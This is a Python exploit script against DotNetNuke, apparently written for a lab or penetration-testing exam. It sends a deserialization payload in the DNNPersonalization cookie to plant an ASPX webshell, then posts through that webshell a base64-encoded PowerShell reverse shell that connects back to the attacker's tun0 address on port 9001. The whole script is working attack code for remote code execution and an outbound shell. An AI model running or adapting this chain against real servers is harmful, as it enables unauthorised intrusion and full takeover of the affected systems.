import sys, re, os
import requests
import subprocess
import base64

def generate_shell():
	# Generate aspx webshell
	cmd = "cp /usr/share/webshells/aspx/cmdasp.aspx ."
	subprocess.run(cmd, shell=True)

def generate_payload(LHOST):
	with open("payload.xml", "r") as f:
		payload = f.read()
	payload = payload.replace('LHOST', LHOST)
	return payload

def send_payload(ip, payload):

	s = requests.Session()

	headers = {
		'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
	}
	s.headers.update(headers)

	# proxies = {
	# 	'http': 'http://127.0.0.1:8080',
	# 	'https': 'http://127.0.0.1:8080'
	# }
	# s.proxies.update(proxies)

	headers = {
		'Content-Type': 'application/x-www-form-urlencoded'
	}

	cookies = {
		'DNNPersonalization': payload
	}
	target = f"http://{ip}/dotnetnuke/xxx"

	r = s.get(target,headers=headers,cookies=cookies)
	if r.status_code != 404:
		print("An error occured sending the payload")
		exit(0)

	print(r.status_code)

def generate_shellcode(LHOST, LPORT):
	command = f"$client = New-Object System.Net.Sockets.TCPClient(\"{LHOST}\",{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
	
	encoded = base64.b64encode(command.encode("utf-16le"))
	encoded = encoded.decode()

	return f"powershell -e {encoded}"

def send_shell(ip, LHOST, LPORT):
	# Generate powershell base64 code
	# Encoded with UTF-16LE
	cmd = generate_shellcode(LHOST, LPORT)

	s = requests.Session()

	headers = {
		'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
	}
	s.headers.update(headers)

	proxies = {
		'http': 'http://127.0.0.1:8080',
		'https': 'http://127.0.0.1:8080'
	}
	s.proxies.update(proxies)
	
	target = f"http://{ip}/dotnetnuke/cmdasp.aspx"
	data = {
		'txtArg': cmd,
		'testing': 'execute'
	}
	
	# Use regex to get out any input cookie requirements from first web request
	r = s.get(target)
	if r.status_code == 404:
		print("ASPX Shell not successfully uploaded!")
		exit(0)

	htmlText = r.text
	input_fields = re.findall(r'input type=\"hidden\" .* />', htmlText)
	for input_field in input_fields:
		input_name = re.findall(r'name=\"(.*)\" id', input_field)[0]
		value = re.findall(r'value=\"(.*)\"', input_field)[0]
		data[input_name] = value

	r = s.post(
		target,
		data=data
	)

def main():
    if len(sys.argv) != 2:
        print ("(+) usage: %s <target>" % sys.argv[0])
        print ('(+) eg: %s 192.168.121.103'  % sys.argv[0])
        sys.exit(-1)

    ip = sys.argv[1]
    LHOST = os.popen('ip addr show tun0').read().split("inet ")[1].split("/")[0]
    LPORT = 9001

    print("Copying shell over from public webshells")
    generate_shell()

    print("Generating payload")
    payload = generate_payload(LHOST)
    print(payload)

    print("Sending payload, make sure you have webserver running on port 80 in current directory")
    send_payload(ip, payload)

    print(f"Sending shell, make sure you have netcat listener runnign on port {LPORT}")
    send_shell(ip, LHOST, LPORT)

if __name__ == '__main__':
	main()